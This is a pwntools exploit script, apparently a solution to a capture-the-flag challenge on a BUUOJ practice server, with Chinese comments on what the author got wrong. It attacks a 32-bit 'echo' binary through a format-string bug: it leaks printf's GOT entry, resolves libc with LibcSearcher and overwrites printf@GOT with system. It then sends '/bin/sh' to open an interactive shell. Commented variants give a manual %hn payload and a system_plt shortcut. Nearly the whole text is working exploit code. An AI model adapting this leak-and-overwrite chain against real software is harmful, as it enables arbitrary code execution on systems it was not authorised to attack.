from pwn import *
from LibcSearcher import *
context(os='linux',arch='i386',log_level='debug')
binary = './echo'
# io = process(binary)
io = remote('node4.buuoj.cn',26328)
elf = ELF(binary)

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + next(libc.search(b'/bin/sh'))

	return (system, binsh)



printf_got = elf.got['printf']
exit_got = elf.got['exit']

command = 0x08048686

payload = p32(printf_got) + b'bb' + b'%7$s'
io.sendline(payload)

io.recvuntil(b'bb')
printf_addr = u32(io.recv(4))
log.success('printf_addr ------> ' + hex(printf_addr))

system_addr, bin_sh_addr = ret2libc(printf_addr, 'printf')

#注意为什么要numbwritten=0xa，这里一开始错了，没理解为什么   原因是sprintf有9个字节："Repeater:" + 为了对齐加的 b"a"
payload = fmtstr_payload(7, {printf_got: system_addr})

#下面是没有使用fmstr_payload手动payload的注释，是以2个字节为单位--以4个字节会报错
# high_system = (system_addr >> 16) & 0xffff
# low_system = system_addr & 0xffff
# payload = b'a' + p32(strlen_got) + p32(strlen_got + 2) + b'%' + bytes(str(low_system-18),encoding='utf-8') + b'c%8$hn'+ b'%' + bytes(str(high_system-low_system),encoding='utf-8') + b'c%9$hn'

io.sendlineafter(b'\n', payload)

io.sendlineafter(b'\n', b'/bin/sh\x00')



#上面是用模板写的，但其实根本不需要泄露system地址，system在程序中调用，用system_plt即可
# printf_got = elf.got['printf']
# system_plt = elf.plt['system']
# payload = fmtstr_payload(7,{printf_got:system_plt})
# io.sendline(payload)
# io.sendline(b'/bin/sh\x00')

io.interactive()